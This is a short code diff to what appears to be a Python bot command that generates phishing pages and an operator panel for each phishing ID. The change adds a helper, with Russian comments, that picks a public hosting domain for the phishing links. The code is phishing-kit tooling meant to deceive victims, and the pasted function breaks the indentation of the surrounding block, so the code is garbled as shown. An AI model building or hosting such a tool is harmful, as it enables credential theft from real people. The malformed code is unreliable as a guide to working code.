@@ -701,7 +701,24 @@ def phantom_cmd(message):
         result = builder.build()
         
         if result:
-            server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host_url.rstrip('/'))
+            # ЗАМЕНИТЬ НА:
+def get_server_url():
+    """Безопасное получение URL сервера"""
+    # Пробуем Railway домен
+    railway_domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
+    if railway_domain:
+        return f"https://{railway_domain}"
+    
+    # Пробуем другие переменные
+    for var in ['REPLIT_DEV_DOMAIN', 'RENDER_EXTERNAL_URL', 'HEROKU_APP_URL']:
+        val = os.environ.get(var)
+        if val:
+            return val if val.startswith('http') else f"https://{val}"
+    
+    # Фолбэк
+    return os.environ.get('SERVER_URL', 'http://localhost:5000')
+
+server_url = get_server_url()
             phish_url = f"{server_url}/phantom/{result['phish_id']}"
             panel_url = f"{server_url}/panel/{result['phish_id']}"
             
